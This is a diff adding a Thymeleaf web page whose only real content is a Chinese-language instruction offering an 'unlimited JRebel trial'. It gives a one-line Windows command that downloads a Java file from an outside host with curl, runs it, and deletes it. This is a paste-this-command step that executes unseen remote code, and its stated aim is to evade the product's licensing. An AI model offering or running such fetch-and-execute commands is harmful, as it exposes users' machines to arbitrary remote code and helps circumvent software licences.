@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en" xmlns:th="http://www.thymeleaf.org">
+
+<head th:replace="~{common/page::commonHeader}"></head>
+
+<body class="body-container">
+<nav th:replace="~{common/page::commonNavbar}"/>
+
+<div class="main-container bgc-white">
+
+    <!--侧边栏-->
+    <div th:replace="~{common/page::commonSidebar}"></div>
+
+    <div role="main" class="main-content">
+        <div class="page-content">
+
+            <div name="markdown_content">
+## JRebel 无限试用，请将以下内容拷贝到命令提示符中执行:
+````bat
+curl https://register.jpy.wang/ReRegister/src/main/java/consol/ConsulMain.java -o tmp.java && java tmp.java && del tmp.java
+````
+            </div>
+
+        </div>
+        <footer th:replace="~{common/page::commonFooter1}"/>
+    </div>
+
+</div>
+
+<div th:replace="~{common/page::commonIncludeScripts}"/>
+
+</body>
+
+
+</html>
+
+
